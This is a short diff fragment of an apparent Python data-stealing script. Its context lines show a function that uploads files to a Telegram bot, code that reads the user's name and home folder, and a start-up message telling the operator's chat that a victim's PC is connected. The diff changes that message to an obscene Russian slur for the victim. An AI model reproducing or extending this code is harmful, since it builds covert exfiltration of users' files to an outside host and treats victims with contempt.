@@ -18,7 +18,7 @@ def send_file_to_telegram(file_path, file_name):
             print(response.text)
 def send_message_on_start():
     username = os.getlogin()
-    bot.send_message(chat_id, f"Подключен пк: {username}")
+    bot.send_message(chat_id, f"Подключен хуесос: {username}")
 send_message_on_start()
 user = os.environ.get("USERNAME")
 user_folder = os.path.expanduser('~')
